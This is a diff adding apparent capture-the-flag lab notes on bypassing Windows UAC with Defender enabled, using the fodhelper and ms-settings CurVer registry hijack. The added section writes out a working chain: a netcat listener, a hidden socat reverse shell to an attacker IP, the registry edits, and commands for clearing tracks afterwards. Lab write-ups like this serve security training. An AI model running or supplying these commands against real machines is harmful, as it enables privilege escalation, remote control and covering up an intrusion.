@@ -65,3 +65,24 @@ THM{AUTOELEVATE4THEWIN}
 
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------
 
+Windows Defender Enabled
+-make a UAC bypass attempt will be shown as an alert
+-using Curver - multiple instances of an application with different versions running on the same system. curver points to the default version of the application to be used 
+
+steps:
+nc -lvp 4445
+C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"
+C:\> reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f
+C:\> reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f
+C:\> fodhelper.exe
+
+C:\> C:\flags\GetFlag-fodhelper-curver.exe
+THM{AV_UAC_BYPASS_4_ALL}
+
+clearing our tracks:
+reg delete "HKCU\Software\Classes\.thm\" /f
+reg delete "HKCU\Software\Classes\ms-settings\" /f
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+UAC Environment variable expansion
